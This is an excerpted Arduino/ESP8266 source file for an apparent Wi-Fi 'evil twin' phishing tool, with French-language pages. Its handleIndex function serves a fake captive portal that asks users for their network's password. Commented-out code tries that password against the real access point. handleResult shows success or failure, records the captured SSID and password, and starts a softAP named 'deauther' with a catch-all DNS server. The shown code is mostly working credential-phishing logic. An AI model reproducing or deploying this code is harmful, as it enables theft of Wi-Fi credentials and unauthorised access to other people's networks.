...
void handleResult() {
  ...
  if (WiFi.status() != WL_CONNECTED) {
    webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 3000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Mauvais mot de passe </h2><p>Reesayez svp.</p></body> </html>");
    Serial.println("Mauvais mot de passe !");
  } else {
    webServer.send(200, "text/html", "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Bon mot de passe</h2></body> </html>");
    ...
    WiFi.softAP("M1z23R", "deauther");
    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    _correct = "La saisie du mot de passe fut un succes : " + _selectedNetwork.ssid +  "\n Mot de passe : " + _tryPassword;
...
String _tempHTML = "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                   "<style> .content {max-width: 500px;margin: auto;}table, th, td {border: 1px solid black;border-collapse: collapse;padding-left:10px;padding-right:10px;} "
...
void handleIndex() {
  ...
  if (hotspot_active == false) {
    ...
    if (webServer.hasArg("password")) {
      ...
      webServer.send(200, "text/html", "<!DOCTYPE html> <html>"
                                       "<head>"
                                       "<style>"
                                       ...
                                       "input[type='text'] { padding: 10px; margin: 10px 0; }"
        ...
        webServer.send(200, "text/html", "<!DOCTYPE html> <html>"
                                       ...
                                       "</head>"
                                       "<body>"
                                       "<h2>Veuillez entrer les identifiants pour " + _selectedNetwork.ssid + " , merci</h2>"
                                       "<form action='/'>"
  ...
  //     WiFi.disconnect();
  //     WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
  //     webServer.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/result';}, 15000); </script></head><body><h2>Veuillez patienter svp...</h2></body> </html>");
  //   } else {
  //       webServer.send(200, "text/html", "<!DOCTYPE html> <html><body><h2>Veuillez entrer les identifiants pour " + _selectedNetwork.ssid + " , merci</h2><form action='/'> <label for='password'>Mot de passe :</label><br> <input type='text' id='password' name='password' value='' minlength='8'><br> <input type='submit' value='Valider'> </form> </body> </html>");
  //   }
  // }
